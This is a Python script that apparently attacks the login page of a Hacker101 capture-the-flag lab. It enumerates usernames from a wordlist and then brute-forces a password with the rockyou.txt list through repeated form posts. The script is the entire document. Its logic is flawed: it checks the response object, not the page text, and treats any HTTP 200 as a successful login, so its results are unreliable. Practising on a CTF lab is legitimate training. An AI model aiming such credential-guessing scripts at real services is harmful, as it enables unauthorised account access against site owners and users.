import requests

url = 'https://8f0b7879523df0dd96edc9e1403f30c7.ctf.hacker101.com/login'
session = requests.Session()
file_path = "my_dirb.txt"
pass_file =  "rockyou.txt"
def user_enum(url):
  with open(file_path,'r') as file:
    for line in file:
      user = line.strip()
      print(f"trying username: {user}",end='\r')
      passwd = ""
      data = {
        "username": user,
        "password": passwd
      }
      res = session.post(url,data)
      if "Invalid username" not in res:
        print(f"valid user found {user}")
        return user
  print("No valid username found")
  exit()

def pass_enum(url):
  user = user_enum(url)
  with open(pass_file,'r') as file:
    for line in file:
      passwd = line.strip()
      print(f"trying password for {user} : {passwd}",end='\r')
      data = {
        "username": user,
        "password": passwd
      }
      res = session.post(url,data)
      if res.status_code == 200:
        print(f"valid password found for {user} : {passwd}")
        break
  print("No valid password found")
pass_enum(url)